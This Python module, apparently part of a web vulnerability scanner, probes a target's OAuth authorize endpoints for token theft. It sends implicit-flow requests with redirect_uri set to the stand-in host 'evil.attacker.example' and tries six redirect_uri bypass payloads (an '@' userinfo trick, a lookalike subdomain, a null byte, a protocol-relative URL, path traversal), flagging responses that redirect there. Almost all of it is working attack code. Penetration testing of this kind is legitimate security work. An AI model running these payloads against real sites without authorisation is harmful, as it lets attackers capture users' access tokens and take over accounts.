"""oauth_token_theft — OAuth token theft via redirect bypass + implicit flow leak"""
from urllib.parse import urlparse, urlencode
from core.http import HttpClient
from core.probe import Probe


class OauthTokenTheft:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        base = f"{u.scheme}://{u.netloc}"

        http = HttpClient(session, logger)
        probe = Probe(session, logger)
        probe.baseline_probe(target)

        evil = "https://evil.attacker.example"
        findings = []

        paths = ["/oauth/authorize", "/oauth2/authorize", "/authorize",
                 "/connect/authorize", "/auth/authorize", "/api/oauth/authorize"]

        for path in paths:
            r = http.get(base + path, allow_redirects=False)
            if not r or r.status_code not in (200, 302, 400):
                continue
            print(f"[oauth_theft] {path} ({r.status_code})")

            # implicit flow leak
            test_url = f"{base}{path}?response_type=token&client_id=test&redirect_uri={evil}&scope=openid"
            r2 = http.get(test_url, allow_redirects=False)
            if r2:
                loc = r2.headers.get("Location", "")
                if evil in loc and "access_token" in loc:
                    print(f"  [!] token leaked to evil")
                    findings.append({"path": path, "type": "token_leak",
                                     "severity": "critical"})
                    logger.finding("oauth_token_theft", "critical", f"{path} leaks token")
                if "#" in loc and "access_token" in loc:
                    findings.append({"path": path, "type": "fragment_leak",
                                     "severity": "high"})
                    logger.finding("oauth_fragment_leak", "high", path)

            # redirect_uri bypasses
            bypasses = [f"{evil}/cb", f"{evil}@legit.com",
                        f"https://legit.com.{evil[8:]}",
                        f"{evil}%00.legit.com", f"//{evil[8:]}",
                        f"https://legit.com/../{evil[8:]}"]
            for b in bypasses:
                enc = urlencode({"x": b})[2:]
                test_url = f"{base}{path}?redirect_uri={enc}&client_id=test&response_type=code"
                r3 = http.get(test_url, allow_redirects=False)
                if r3 and evil[8:] in r3.headers.get("Location", ""):
                    print(f"  [!] redirect bypass: {b[:50]}")
                    findings.append({"path": path, "bypass": b,
                                     "severity": "critical"})
                    logger.finding("oauth_redirect_bypass", "critical", b[:60])

        print(f"[oauth_token_theft] total: {len(findings)}")
        return {"findings": findings}
